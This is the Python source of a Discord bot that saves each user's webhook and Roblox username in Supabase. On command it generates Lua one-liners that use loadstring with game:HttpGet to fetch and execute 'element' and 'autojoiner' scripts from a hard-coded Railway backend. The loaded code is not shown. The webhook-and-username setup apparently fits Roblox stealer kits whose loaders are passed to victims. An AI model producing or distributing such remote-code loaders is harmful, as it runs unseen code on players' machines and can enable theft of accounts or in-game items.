import os
import discord
from discord import app_commands
from discord.ext import commands
from supabase import create_client, Client

TOKEN = os.getenv("DISCORD_TOKEN")
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

# !!! schimbă cu URL-ul Railway unde rulează main.py
BACKEND_URL = "https://web-production-d7a92.up.railway.app/"

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree


@bot.event
async def on_ready():
    await tree.sync()
    print(f"✅ Bot conectat ca {bot.user}")


# ---------------------------
# SET WEBHOOK
# ---------------------------
@tree.command(name="setwebhook", description="Set your webhook")
async def set_webhook(interaction: discord.Interaction, webhook: str):
    user_id = str(interaction.user.id)

    existing = supabase.table("elements").select("id").eq("user_id", user_id).execute()
    if existing.data:
        supabase.table("elements").update({"webhook": webhook}).eq("user_id", user_id).execute()
    else:
        supabase.table("elements").insert({"user_id": user_id, "webhook": webhook}).execute()

    await interaction.response.send_message(
        f"✅ Webhook set `{webhook}`",
        ephemeral=True
    )


# ---------------------------
# SET USERNAME
# ---------------------------
@tree.command(name="setusername", description="Set your Roblox username")
async def set_username(interaction: discord.Interaction, username: str):
    user_id = str(interaction.user.id)

    existing = supabase.table("elements").select("id").eq("user_id", user_id).execute()
    if existing.data:
        supabase.table("elements").update({"username": username}).eq("user_id", user_id).execute()
    else:
        supabase.table("elements").insert({"user_id": user_id, "username": username}).execute()

    await interaction.response.send_message(
        f"✅ Username set `{username}`",
        ephemeral=True
    )


# ---------------------------
# GENERATE ELEMENT SCRIPT
# ---------------------------
@tree.command(name="generate", description="Generate your Element Script")
async def generate(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    existing = supabase.table("elements").select("id").eq("user_id", user_id).execute()

    if not existing.data:
        await interaction.response.send_message(
            "❌ You need to set your webhook and username first with `/setwebhook` and `/setusername`.",
            ephemeral=True
        )
        return

    element_id = existing.data[0]["id"]

    msg = (
        "## Your Element Script\n\n"
        f"```lua\n"
        f'ID="{element_id}";\n'
        f'loadstring(game:HttpGet("{BACKEND_URL}/cdn/element.lua?id={element_id}"))()\n'
        f"```"
    )

    await interaction.response.send_message(msg, ephemeral=True)


# ---------------------------
# GENERATE AUTOJOINER SCRIPT
# ---------------------------
@tree.command(name="generate-autojoiner", description="Generate your Auto Joiner Script")
async def generate_autojoiner(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    existing = supabase.table("elements").select("id").eq("user_id", user_id).execute()

    if not existing.data:
        await interaction.response.send_message(
            "❌ You need to generate Element Script first with `/generate`.",
            ephemeral=True
        )
        return

    element_id = existing.data[0]["id"]

    msg = (
        "## ⚠️ DON'T SHARE! THIS CONTAINS YOUR PRIVATE KEY! ⚠️\n\n"
        f"```lua\n"
        f'ID="{element_id}";\n'
        f'loadstring(game:HttpGet("{BACKEND_URL}/cdn/autojoiner.lua?id={element_id}"))()\n'
        f"```"
    )

    await interaction.response.send_message(msg, ephemeral=True)


bot.run(TOKEN)
